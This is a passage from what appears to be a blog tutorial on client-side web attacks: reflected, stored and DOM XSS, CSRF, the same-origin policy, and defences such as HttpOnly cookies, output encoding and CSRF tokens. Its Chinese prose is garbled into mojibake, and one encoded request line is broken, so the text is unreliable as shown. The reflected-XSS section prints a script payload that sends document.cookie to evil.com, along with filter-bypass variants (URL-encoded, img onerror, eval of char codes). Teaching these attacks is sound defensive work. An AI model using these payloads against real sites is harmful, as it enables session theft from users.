åµŒå…¥HTMLä¸­é€šè¿‡HTTPå›å¤å†åå°„ç»™ç”¨æˆ·ï¼Œè¿›è€Œæµè§ˆå™¨è§£ææ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œé€ æˆå±å®³ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé»‘å®¢ä¼šé€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦çš„æ‰‹æ®µæ¥è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„é“¾æ¥ã€‚ åå°„å‹XSSä¹Ÿè¢«ç§°ä¸ºéæŒä¹…åŒ–XSSï¼Œå› ä¸ºå…¶è¦æ±‚ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥æ‰èƒ½æ‰§è¡Œä¸€æ¬¡ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜åå°„å‹XSSæ˜¯å¦‚ä½•å·¥ä½œå¹¶é€ æˆæŸå®³çš„ï¼š   æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªé¡µé¢çš„å«åš xss_test.php ï¼Œå…¶ä¸­æœ‰ä¸€æ®µä»£ç è¦æ±‚ç”¨æˆ·è¾“å…¥ç”¨æˆ·åï¼Œè¾“å…¥çš„ç”¨æˆ·åä¼šè¿”å›åˆ°é¡µé¢ä¸Š Welcome \u0026lt;?php echo $_GET[\u0026#39;inject\u0026#39;]; ?\u0026gt;  ç”¨æˆ·ç‚¹å‡»äº†ä¸€æ¡æ¶æ„ä¿®æ”¹çš„ç½‘é¡µé“¾æ¥ http://www.example.com/xss_test.php?inject=\u0026lt;script\u0026gt;document.location= \u0026#39;http://evil.com/log.php?\u0026#39;+document.cookie\u0026lt;/script\u0026gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œinjectå‚æ•°è¢«è®¾ç½®ä¸ºäº† script tagçš„ä»£ç æ¥è®¿é—®æ”»å‡»è€…çš„åŸŸåå¹¶æä¾›å½“å‰ç½‘é¡µæ‰€æ‹¥æœ‰çš„cookieçš„å€¼   åœ¨ç”¨æˆ·ç‚¹å‡»ä¹‹åï¼Œæµè§ˆå™¨å°±ä¼šç”ŸæˆHTTPè¯·æ±‚å‘æœåŠ¡å™¨å¯»æ±‚èµ„æºï¼Œå…¶ä¸­å°±åŒ…å«äº†æ”»å‡»è€…æ‰€åŒ…å«çš„æ¶æ„ä»£ç  GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E Host: www.example.com ...   æœåŠ¡ç«¯çš„è„šæœ¬é€šè¿‡å°†åŸæœ¬åº”è¯¥ä¸ºç”¨æˆ·åçš„å†…å®¹æ‹¼æ¥æˆhtmlè¿”å›ç»™ç”¨æˆ·ï¼Œç„¶åç”±æµè§ˆå™¨è‡ªåŠ¨è§£ææ‰§è¡Œï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼Œç”¨æˆ·çš„cookieè¢«è¿”å›ç»™äº†æ”»å‡»è€…çš„ç½‘ç«™ï¼Œé€ æˆäº†æ³„éœ²   å¼€å‘è€…ä¼šåˆ©ç”¨å„ç§åŠæ³•æ¥ç›¸åŠæ³•æ¥è¿‡æ»¤è¿™äº›æ¶æ„ç¯¡æ”¹çš„è¯·æ±‚ï¼Œç”¨æˆ·ä¹Ÿå¾ˆå®¹æ˜“å‘ç°å¼‚å¸¸çš„é“¾æ¥ï¼Œä½†æ˜¯æ”»å‡»è€…ä»ç„¶å¯ä»¥ç”¨æ¨¡ç³Šçš„æ‰‹æ³•æ¥è¿›è¡Œç»•è¿‡ ä¾‹å¦‚ï¼š   Url encoding: http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E   ä¸ä½¿ç”¨ \u0026lt;script\u0026gt; tagï¼š http://www.example.com/xss_test.php?inject=\u0026lt;img%20onerror=\u0026#34;javascript:%20alert(document.cookie);\u0026#34;%20src=asd\u0026gt;   åŠ¨æ€æ‰§è¡Œï¼ˆåŠ¨æ€çš„æ„å»ºæ¶æ„ä»£ç çš„å†…å®¹ï¼‰ http://www.example.com/xss_test.php?inject=\u0026lt;script\u0026gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))\u0026lt;/script\u0026gt;   æˆ‘ä»¬ç”šè‡³å¯ä»¥å°†åŒ…å«æ¼æ´çš„é“¾æ¥é€šè¿‡çŸ­ç½‘å€ç¼©çŸ­æˆ–è€…è½¬æ¢ä¸ºäºŒç»´ç æ¥ç»•è¿‡æ£€æµ‹ Stored XSS å­˜å‚¨å‹ XSS å­˜å‚¨å‹XSSé¡¾åæ€ä¹‰ï¼Œæ¶æ„ä»£ç ä¼šå…ˆè¢«æ”»å‡»è€…å­˜å‚¨åœ¨ç½‘é¡µçš„æœåŠ¡ç«¯çš„æ•°æ®åº“å½“ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œå­˜å‚¨çš„æ¶æ„ä»£ç ä¼šè¢«æœåŠ¡ç«¯è‡ªåŠ¨åµŒå…¥HTMLä¸­ï¼Œç„¶åç”±æµè§ˆå™¨è§£ææ‰§è¡Œï¼Œé€ æˆå±å®³ã€‚ é‚£ä¹ˆè¿™ç§æ”»å‡»ä¸€èˆ¬å°±å‘ç”Ÿåœ¨ç”¨æˆ·å¯ä»¥è·å–å…¶ä»–ç”¨æˆ·è¿›è¡Œçš„è¾“å…¥ï¼Œå¸¸è§çš„å°±æœ‰è®ºå›æˆ–è€…ç•™è¨€æ¿ç­‰å†…å®¹ã€‚ å­˜å‚¨å‹XSSä¸åå°„å‹XSSæœ€å¤§çš„åŒºåˆ«å°±æ˜¯å®ƒæ˜¯persistentæŒä¹…çš„ï¼Œå¹¶ä¸”æ‰€æœ‰èƒ½å¤Ÿè·å–æ¶æ„ä»£ç å†…å®¹çš„ç”¨æˆ·éƒ½ä¼šæ”¶åˆ°å½±å“ï¼ŒåŒæ—¶ç”¨æˆ·çš„é˜²å¤‡æ›´å°ï¼Œå› ä¸ºç½‘é¡µé“¾æ¥æ˜¯æ­£å¸¸çš„ï¼Œè€Œåœ¨æ­£å¸¸åŠ è½½ä¸­å´å‡ºç°äº†æ¶æ„ä»£ç çš„æ‰§è¡Œï¼Œå¯è°“é˜²ä¸èƒœé˜²ã€‚ æ€»ç»“æ¥è¯´Stored XSSçš„æ‰§è¡Œåˆ†ä¸¤æ­¥èµ°  Step1  æ”»å‡»è€…ä¸Šä¼ è¿˜æœ‰æ¶æ„è„šæœ¬ä»£ç çš„å†…å®¹åˆ°æœåŠ¡å™¨  æœåŠ¡å™¨é•¿æœŸå­˜å‚¨è¿™äº›æ¶æ„è„šæœ¬ä»£ç ï¼ˆå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼‰    Step2  å—å®³è€…è®¿é—®è¿™äº›æœ‰æ¼æ´çš„ç½‘é¡µ  æœåŠ¡å™¨ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„è„šæœ¬ä»£ç åµŒå…¥è¿”å›ç»™å—å®³è€…çš„ç½‘é¡µä¸­  ç»§è€Œæµè§ˆå™¨è‡ªåŠ¨è§£æå’Œæ‰§è¡Œè¿™äº›æ¶æ„è„šæœ¬ä»£ç      DOM-based XSS åœ¨ä»‹ç»DOM XSSä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆäº†è§£ä¸€ä¸‹DOMæ˜¯ä»€ä¹ˆï¼š DOM(Document object model)æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå°†ç½‘é¡µå½“ä½œä¸€ä¸ªæ–‡æ¡£ï¼Œå¹¶ç”¨ä¸€ç§æ ‘çŠ¶ç»“æ„å­˜å‚¨ç½‘é¡µä¸­çš„æ‰€æœ‰çš„æ ‡ç­¾ï¼Œä»¥åŠå…¶ä»–çš„ä¿¡æ¯ï¼Œå¹¶æä¾›äº†APIä¾›JSç­‰è„šæœ¬è¯­è¨€å¯¹é¡µé¢å†…å®¹è¿›è¡ŒæŸ¥è¯¢ä¸ä¿®æ”¹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·æ¥æŸ¥çœ‹ç½‘é¡µçš„DOMå†…å®¹ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹çœ‹JSä»£ç è°ƒç”¨DOM APIçš„æ•ˆæœï¼Œæ­¤å¤„çš„window/documentå…ƒç´ å°±ä»£è¡¨ç€æ•´ä¸ªç½‘é¡µæ–‡æ¡£ï¼Œ \u0026lt;body onload=\u0026#34;window.alert(\u0026#39;welcome to my home page!\u0026#39;);\u0026#34;\u0026gt; è¿˜å¯ä»¥ä¸ºç½‘é¡µåˆ›å»ºæ ‡ç­¾ï¼Œå†™å…¥å†…å®¹ç­‰ä¿¡æ¯ã€‚ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; // run this function when the document is loaded  window.onload = function() { // create a couple of elements  // in an otherwise empty HTML page  heading = document.createElement(\u0026#34;h1\u0026#34;); heading_text = document.createTextNode(\u0026#34;Big Head!\u0026#34;); heading.appendChild(heading_text); document.body.appendChild(heading); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; é‚£ä¹ˆæˆ‘ä»¬å›åˆ° DOM XSSï¼Œå…¶ä¸å‰é¢ä¸¤ç§XSSçš„æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºï¼Œæ”»å‡»çš„è¿‡ç¨‹å®Œå…¨åªæ¶‰åŠå®¢æˆ·ç«¯ï¼Œè€Œä¸ä¾èµ–æœåŠ¡å™¨ç«¯çš„è¿”å›ã€‚ å…¶æ­¥éª¤ä¸€èˆ¬ä¸ºï¼š  æ”»å‡»è€…æ„é€ ä¸€æ®µå«æœ‰ä¸€æ®µç›´æ¥ç¯¡æ”¹DOMç»“æ„çš„ä»£ç çš„é“¾æ¥ç„¶åå‘é€ç»™å—å®³è€…  å—å®³è€…ç‚¹å‡»é“¾æ¥å¹¶å‘æœåŠ¡å™¨è¯·æ±‚ç½‘é¡µ  æœåŠ¡å™¨ç«¯æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯çœ‹ä¸æ‡‚ä¹Ÿæ— æ³•æ‰§è¡Œç¯¡æ”¹DOMç»“æ„çš„ä»£ç ï¼Œç›´æ¥å°†å…¶ä¸åŸæœ¬åˆæ³•çš„ç½‘é¡µè¿”å›ç»™å®¢æˆ·ç«¯  å®¢æˆ·ç«¯è§£æç½‘é¡µåŒæ—¶å‘ç°æœ‰ä¿®æ”¹DOMç»“æ„çš„ä»£ç ï¼Œè§£ææ‰§è¡Œï¼Œé€ æˆå±å®³   XSSçš„å±å®³ BeEFä»¥åŠå„ç±»XSSå¹³å°éƒ½æä¾›äº†è‡ªåŠ¨è„šæœ¬ï¼Œåªéœ€è¦å°†ç»„ç»‡å¥½çš„è„šæœ¬æ’å…¥ï¼Œå°±å¯ä»¥æ‰§è¡Œè‡ªå·±æƒ³è¦çš„æ“ä½œ   CSRF Cross-Site Request Forgery (CSRF, è¯»åš \u0026ldquo;sea-surf\u0026rdquo;)ï¼Œå…¶ä¸»è¦ç›®æ ‡æ˜¯åˆ©ç”¨ç”¨æˆ·å·²ç»ç™»å½•çš„ç™»å½•å‡­è¯ï¼ˆsession cookieï¼‰æ¥æ‰§è¡Œä¸€ç³»åˆ—è¶Šæƒçš„æ“ä½œã€‚ CSRFçš„ä¸»è¦æ‰§è¡Œæµç¨‹ä¸ºï¼š   å—å®³è€…å…ˆç™»å½•å­˜åœ¨æ¼æ´çš„ç½‘ç«™ï¼Œå¹¶ä¸”ä¿å­˜session cookieçš„å†…å®¹åœ¨æœ¬åœ°ï¼Œæ— éœ€é‡å¤ç™»å½•   é»‘å®¢å‘å—å®³è€…å‘é€ä¸€ä¸ªæ¶æ„ç½‘ç«™çš„é“¾æ¥ï¼ˆé“¾æ¥ä¸­åªå¯ä»¥åŒ…å«ç½‘å€ï¼‰ï¼Œå—å®³è€…ç‚¹å‡»åè¯·æ±‚è¯¥ç½‘é¡µçš„èµ„æº   è¿™ä¸ªç½‘é¡µä¸­å¸¦æœ‰éšè—è¡¨æ ¼æ¥è‡ªåŠ¨å‘èµ·POSTè¯·æ±‚ï¼Œå‘å­˜åœ¨æ¼æ´çš„ç›®æ ‡ç½‘ç«™å‘é€æ¶æ„æ“ä½œçš„è¯·æ±‚ï¼ˆä¾‹å¦‚ä¿®æ”¹è´¦å·å¯†ç ï¼‰ æ­¤ä¸¾èƒ½å¤ŸæˆåŠŸæ˜¯å› ä¸ºæµè§ˆå™¨åœ¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨å¸¦ä¸Šè¯¥åŸŸåä¸‹çš„æ‰€æœ‰æœ¬åœ°å­˜å‚¨çš„cookieï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ˜¯æœ¬äººå‘å‡ºçš„ä¿®æ”¹è¯·æ±‚ è€Œç”¨æˆ·æœ¬äººå¯ä»¥å¯¹æ¬¡å®Œå…¨ä¸çŸ¥æƒ…    æˆ‘ä»¬è¿™é‡Œå¯ä»¥æ€»ç»“ä¸€ä¸‹CSRFä¸XSSçš„åŒºåˆ«ï¼Œæˆ‘ä»¬å‡è®¾å­˜åœ¨æ¼æ´çš„ç½‘ç«™ä¸º www.vulnerable.comï¼Œé»‘å®¢æ„é€ çš„ç½‘é¡µå«åš www.malicious.com   åœ¨XSSä¸­è¦å®Œæˆçš„ç›®æ ‡æ˜¯ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡» www.vulnerable.com çš„é“¾æ¥ï¼ˆDOMï¼ŒReflectedéœ€è¦ä¿®æ”¹urlï¼ŒStoredåˆ™ä¸éœ€è¦ï¼‰ï¼Œç„¶åä½¿æµè§ˆå™¨åœ¨å½“å‰é¡µé¢ä¸‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä¾‹å¦‚ç›´æ¥ç›—å–cookie   åœ¨CSRFä¸­è¦å®Œæˆçš„ç›®æ ‡æ˜¯ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡» www.malicious.com çš„é“¾æ¥ï¼Œwww.malicious.comçš„ç½‘é¡µå†…å®¹ä¸­ä¼šè‡ªåŠ¨åœ°å‘ www.vulnerable.com å‘èµ·HTTPè¯·æ±‚ï¼ŒåŒæ—¶æµè§ˆå™¨ä¼šé™„å¸¦ä¸Šæ‰€æœ‰åŸŸåwww.vulnerable.comä¸‹çš„cookieï¼Œä»è€Œä¼ªè£…æˆç”¨æˆ·å¯¹æœåŠ¡å™¨ç«¯é€ æˆå½±å“   Same-origin policy æµè§ˆå™¨çš„åŒæºç­–ç•¥ çœ‹åˆ°äº†ä¸Šé¢çš„ä¾‹å­ä¹‹åï¼Œæˆ‘æƒ³æå‡ºä¸€ä¸ªé—®é¢˜ï¼Ÿä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½ç›´æ¥ä»ç¬¬ä¸‰æ–¹ç½‘ç«™è·å–ç›®æ ‡ç½‘ç«™ä¸‹çš„cookieå‘¢ï¼Ÿ è¿™é‡Œå°±æ¶‰åŠåˆ°äº†æµè§ˆå™¨çš„åŒæºç­–ç•¥ åŒæºç­–ç•¥çš„æ˜¯å„ä¸ªæµè§ˆå™¨ç”¨äºé™åˆ¶ä¸åŒæºçš„ç½‘é¡µç›´æ¥è¿›è¡Œèµ„æºäº¤æ¢çš„è¡Œä¸ºçš„ä¸€ç§å®‰å…¨ç­–ç•¥ æˆ‘ä»¬è¿™é‡Œéœ€è¦å¼ºè°ƒåŒæºç­–ç•¥æ˜¯ç”±æµè§ˆå™¨åˆ¶å®šçš„ï¼Œç”¨äºä¿æŠ¤å­˜æ”¾åœ¨æµè§ˆå™¨ä¸Šçš„å†…å®¹ï¼Œæ¯”å¦‚ç›¸å½“é‡è¦çš„session cookieï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥åˆ©ç”¨ document.cookie æ¥è·å–å½“å‰é¡µé¢çš„cookieï¼Œå¦‚æœæ²¡æœ‰åŒæºç­–ç•¥ï¼Œé‚£ä¹ˆé»‘å®¢å°±å¯ä»¥é€šè¿‡æ³¨å…¥JSè„šæœ¬æ¥è·å–ç”¨æˆ·å­˜æ”¾ä¸å®¢æˆ·ç«¯çš„æ‰€æœ‰å†…å®¹ï¼Œä¹Ÿå¯ä»¥ç»§ç»­è°ƒç”¨DOMçš„APIè¿›è¡ŒDOMå†…å®¹çš„ä¿®æ”¹ä»¥åŠè®¿é—®ï¼Œè¿™æ˜¯éå¸¸å±é™©çš„ã€‚ Definition of an origin åŒæºçš„æ¦‚å¿µ ä¸¤ä¸ªURLså¦‚æœè¢«ç§°ä¸ºåŒæºï¼Œä»–ä»¬å¿…é¡»è¦ä¿è¯åè®®(http/https),ç«¯å£ï¼ˆå¦‚æœè¢«æŒ‡å®šäº†çš„è¯ï¼‰ä¸€è‡´ï¼Œè®¿é—®èµ„æºçš„è·¯å¾„ä¸ä¸€æ ·æ²¡æœ‰å…³ç³» æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥è§£é‡Š é’ˆå¯¹URLï¼š http://store.company.com/dir/page.html    URL ç±»åˆ« åŸå›      http://store.company.com/dir2/other.html åŒæº åªæœ‰è·¯å¾„ä¸åŒ   http://store.company.com/dir/inner/another.html åŒæº åªæœ‰è·¯å¾„ä¸åŒ   https://store.company.com/page.html ä¸åŒæº åè®®ä¸åŒ   http://store.company.com:81/dir/page.html ä¸åŒæº ç«¯å£å·ä¸åŒ   http://news.company.com/dir/page.html ä¸åŒæº Hostä¸åŒ    è·¨ç«™ç½‘ç»œè®¿é—® ä¸åŒæºçš„ç½‘é¡µä¹‹é—´è¿›è¡Œäº¤äº’çš„æ–¹å¼ä¸€èˆ¬ç”±ä¸‰ç§ï¼š  Cross-origin writes è·¨ç«™å†™æ“ä½œï¼šä¸€èˆ¬æ¥è¯´æ˜¯è¢«å…è®¸çš„ã€‚æ¯”å¦‚é¡µé¢ä¸­çš„é“¾æ¥ï¼ˆlinksï¼‰ï¼Œé‡å®šå‘ä»¥åŠè¡¨å•æäº¤  Cross-origin embedding è·¨ç«™èµ„æºåµŒå…¥ï¼šä¸€èˆ¬æ¥è¯´ä¹Ÿæ˜¯è¢«å…è®¸çš„  Cross-origin reads è·¨ç«™è¯»æ“ä½œï¼šä¸€èˆ¬æ¥è¯´æ˜¯ä¸è¢«å…è®¸çš„ï¼Œå³ä»ä¸€ä¸ªç½‘é¡µå‘å¦ä¸€ä¸ªç½‘é¡µç›´æ¥è·å–æ•°æ®   è·¨ç«™èµ„æºåµŒå…¥çš„ä¸€äº›ä¾‹å­ï¼š  \u0026lt;script src=\u0026rdquo;\u0026hellip;\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; æ ‡ç­¾åµŒå…¥è·¨ç«™è„šæœ¬ã€‚è¯­æ³•é”™è¯¯ä¿¡æ¯åªèƒ½è¢«åŒæºè„šæœ¬ä¸­æ•æ‰åˆ°ã€‚  \u0026lt;link rel=\u0026ldquo;stylesheet\u0026rdquo; href=\u0026quot;\u0026hellip;\u0026quot;\u0026gt; æ ‡ç­¾åµŒå…¥CSSã€‚ç”±äºCSSçš„æ¾æ•£çš„è¯­æ³•è§„åˆ™ï¼ŒCSSçš„è·¨ç«™éœ€è¦ä¸€ä¸ªè®¾ç½®æ­£ç¡®çš„ HTTP å¤´éƒ¨ Content-Type ã€‚ä¸åŒæµè§ˆå™¨æœ‰ä¸åŒçš„é™åˆ¶ï¼š IE, Firefox, Chrome, Safari (è·³è‡³CVE-2010-0051)éƒ¨åˆ† å’Œ Operaã€‚  é€šè¿‡ \u0026lt;img\u0026gt; å±•ç¤ºçš„å›¾ç‰‡ã€‚æ”¯æŒçš„å›¾ç‰‡æ ¼å¼åŒ…æ‹¬PNG,JPEG,GIF,BMP,SVG,\u0026hellip;  é€šè¿‡ \u0026lt;video\u0026gt; å’Œ \u0026lt;audio\u0026gt; æ’­æ”¾çš„å¤šåª’ä½“èµ„æºã€‚  é€šè¿‡ \u0026lt;object\u0026gt;ã€ \u0026lt;embed\u0026gt; å’Œ \u0026lt;applet\u0026gt; åµŒå…¥çš„æ’ä»¶ã€‚  é€šè¿‡ @font-face å¼•å…¥çš„å­—ä½“ã€‚ä¸€äº›æµè§ˆå™¨å…è®¸è·¨ç«™å­—ä½“ï¼ˆcross-origin fontsï¼‰ï¼Œä¸€äº›éœ€è¦åŒæºå­—ä½“ï¼ˆsame-origin fontsï¼‰ã€‚  é€šè¿‡ \u0026lt;iframe\u0026gt; è½½å…¥çš„ä»»ä½•èµ„æºã€‚ç«™ç‚¹å¯ä»¥ä½¿ç”¨ X-Frame-Options æ¶ˆæ¯å¤´æ¥é˜»æ­¢è¿™ç§å½¢å¼çš„è·¨ç«™äº¤äº’ã€‚   å¦‚ä½•å…è®¸è·¨ç«™è®¿é—® å¯ä»¥é€šè¿‡ç”±æœåŠ¡ç«¯å‘å›çš„HTTPå“åº”ä¸­ï¼Œæ·»åŠ  CORS fieldæ¥æŒ‡å®šé‚£äº›hostå¯ä»¥åŠ è½½èµ„æº å¦‚ä½•é˜»æ­¢è·¨ç«™è®¿é—®  é˜»æ­¢è·¨ç«™å†™æ“ä½œï¼Œåªè¦æ£€æµ‹è¯·æ±‚ä¸­çš„ä¸€ä¸ªä¸å¯æ¨æµ‹çš„æ ‡è®°(CSRF token)å³å¯ï¼Œè¿™ä¸ªæ ‡è®°è¢«ç§°ä¸º Cross-Site Request Forgery (CSRF) æ ‡è®°ã€‚ä½ å¿…é¡»ä½¿ç”¨è¿™ä¸ªæ ‡è®°æ¥é˜»æ­¢é¡µé¢çš„è·¨ç«™è¯»æ“ä½œã€‚  é˜»æ­¢èµ„æºçš„è·¨ç«™è¯»å–ï¼Œéœ€è¦ä¿è¯è¯¥èµ„æºæ˜¯ä¸å¯åµŒå…¥çš„ã€‚é˜»æ­¢åµŒå…¥è¡Œä¸ºæ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºåµŒå…¥èµ„æºé€šå¸¸å‘å…¶æš´éœ²ä¿¡æ¯ã€‚  é˜»æ­¢è·¨ç«™åµŒå…¥ï¼Œéœ€è¦ç¡®ä¿ä½ çš„èµ„æºä¸èƒ½é€šè¿‡ä»¥ä¸Šåˆ—å‡ºçš„å¯åµŒå…¥èµ„æºæ ¼å¼ä½¿ç”¨ã€‚æµè§ˆå™¨å¯èƒ½ä¸ä¼šéµå®ˆ Content-Type å¤´éƒ¨å®šä¹‰çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨åœ¨HTMLæ–‡æ¡£ä¸­æŒ‡å®š \u0026lt;script\u0026gt; æ ‡è®°ï¼Œåˆ™æµè§ˆå™¨å°†å°è¯•å°†æ ‡ç­¾å†…éƒ¨çš„ HTML è§£æä¸ºJavaScriptã€‚ å½“æ‚¨çš„èµ„æºä¸æ˜¯æ‚¨ç½‘ç«™çš„å…¥å£ç‚¹æ—¶ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨CSRFä»¤ç‰Œæ¥é˜²æ­¢åµŒå…¥ã€‚   è·¨ç«™æ•°æ®å­˜å‚¨è®¿é—® Cookies ä½¿ç”¨ä¸åŒçš„æºå®šä¹‰æ–¹å¼ã€‚ä¸€ä¸ªé¡µé¢å¯ä»¥ä¸ºæœ¬åŸŸå’Œå…¶çˆ¶åŸŸè®¾ç½® cookieï¼Œåªè¦æ˜¯çˆ¶åŸŸä¸æ˜¯å…¬å…±åç¼€ï¼ˆpublic suffixï¼‰å³å¯ã€‚Firefox å’Œ Chrome ä½¿ç”¨ Public Suffix List æ£€æµ‹ä¸€ä¸ªåŸŸæ˜¯å¦æ˜¯å…¬å…±åç¼€ï¼ˆpublic suffixï¼‰ã€‚ Countermeasure å¦‚ä½•é˜²èŒƒé’ˆå¯¹WEBå®¢æˆ·ç«¯çš„æ”»å‡» æˆ‘ä»¬å¯ä»¥å°†ä¸»è¦çš„å¯¹ç­–åˆ†ä¸ºä¸¤ç§  å®¢æˆ·ç«¯ å®¢æˆ·ç«¯çš„é˜²å¾¡ä¾èµ–äºç”¨æˆ·çš„å®‰å…¨æ„è¯†ä»¥åŠä¸€äº›æµè§ˆå™¨è¿˜æœ‰æ’ä»¶çš„è¾…åŠ©  å°½é‡è®¿é—®åŸå§‹ç½‘ç«™ï¼Œä¸è¦è®¿é—®é‚£äº›åé¢å¸¦ç€å¾ˆå¤šGETå‚æ•°çš„é“¾æ¥  é»˜è®¤å…³é—­JSæ¥é¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œ  åœ¨è®¿é—®æ¯”è¾ƒæ•æ„Ÿçš„ç½‘é¡µçš„æ—¶å€™å°½é‡ä¸è¦è®¿é—®å…¶ä»–çš„ç½‘ç«™  åŠæ—¶å…³é—­é‡å¯æµè§ˆå™¨    æœåŠ¡ç«¯ XSS   HttpOnly cookie: æœåŠ¡ç«¯ç»™ä¸€äº›é‡è¦çš„cookieè®¾ç½® HttpOnly å±æ€§ï¼Œä»è€Œé¿å…è¿™äº›cookieè¢«è„šæœ¬è¯­è¨€æ‰€è°ƒç”¨æŸ¥çœ‹ä»¥åŠåˆ©ç”¨   Input validation è¾“å…¥æ£€æŸ¥ï¼š å¯¹äºæ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥æˆ‘ä»¬éƒ½éœ€è¦è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ä»¥åŠè¿‡æ»¤ï¼Œç»„ç»‡ä¸€äº›æ¶æ„è„šæœ¬çš„æ’å…¥ï¼ˆe.g. htmlspecialchars() in phpï¼‰   Output validation \u0026amp; HTML encode è¾“å‡ºæ£€æŸ¥ä¸HTMLç¼–ç ï¼š æˆ‘ä»¬é™¤äº†å¯¹ç”¨æˆ·å‘é€è¿‡æ¥çš„HTTPè¯·æ±‚è¿›è¡Œæ£€æŸ¥ï¼Œè¿˜éœ€è¦åœ¨è¿”å›HTMLä»£ç ä¹‹å‰è¿›è¡ŒäºŒæ¬¡æ£€æŸ¥ï¼Œå› ä¸ºå¯èƒ½åœ¨æœåŠ¡å™¨ç«¯çš„è„šæœ¬æ‰§è¡Œä¹‹åï¼Œä¸€äº›æ¶æ„çš„ä»£ç è¢«åµŒå…¥åˆ°äº†HTMLä»£ç ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¾‹å¦‚ HTML encode çš„æ–¹æ³•å°†ç‰¹æ®Šå­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸º HTML entities æ¥é¿å…è¿™æ ·çš„æƒ…å†µå‘ç”Ÿ   CSRF   Two-factor authentication (e.g.,éªŒè¯ç ) å› ä¸ºåœ¨CSRFä¸­ï¼Œå¾€å¾€åœ¨ç”¨æˆ·æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°±å‘ç”Ÿäº†é’ˆå¯¹ç”¨æˆ·è´¦å·çš„æ”»å‡»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®¾ç½®åŒé‡è®¤è¯æ¥ä¿æŠ¤é‚£äº›é‡è¦çš„æ“ä½œå¿…é¡»åœ¨ç”¨æˆ·çš„è®¸å¯ä¸‹æ‰èƒ½æ‰§è¡Œ   CSRF tokens   Refereræ£€æŸ¥ æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ˜¯é€šè¿‡åˆç†çš„åŸŸåä¸‹è·³è½¬è€Œæ¥çš„ï¼Œæ¯”å¦‚æäº¤è¡¨å•æ˜¯ç”±å‘å¸–é¡µé¢è·³è½¬è€Œæ¥ã€‚     CSRF tokens CSRF tokensæ˜¯ç”±æœåŠ¡ç«¯äº§ç”Ÿçš„ï¼Œåœ¨ç”¨æˆ·ç™»å½•ä¹‹ååœ¨HTTP Responseä¸­å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°†è¿™ä¸ªtokenå­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¾‹å¦‚æ·»åŠ ä¸€ä¸ªéšè—çš„å­—æ®µä¸­ å½“ç”¨æˆ·å†æ¬¡å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¼šæ£€æŸ¥tokenæ˜¯å¦åœ¨HTTP headerå½“ä¸­ï¼Œä»è€Œé¢„é˜²CSRF å› ä¸ºé€šè¿‡é»‘å®¢çš„ç½‘ç«™å‘å‡ºçš„è¯·æ±‚ï¼Œåªèƒ½æœ€å¤šåŒ…å«cookieçš„å†…å®¹ï¼Œå´ä¸èƒ½åŒ…å«å­˜åœ¨äºåŸå§‹é¡µé¢ä¸­çš„éšè—tokenï¼Œå¯¼è‡´è®¿é—®å¤±è´¥ Reference XSS ä»é›¶å¼€å§‹ Pikachué¶åœºé€šå…³ä¹‹Cross-site request forgery Same-origin policy ã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ ","date":"2022-05-19T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/client_side_attacks/","title":"Client-side Attacks 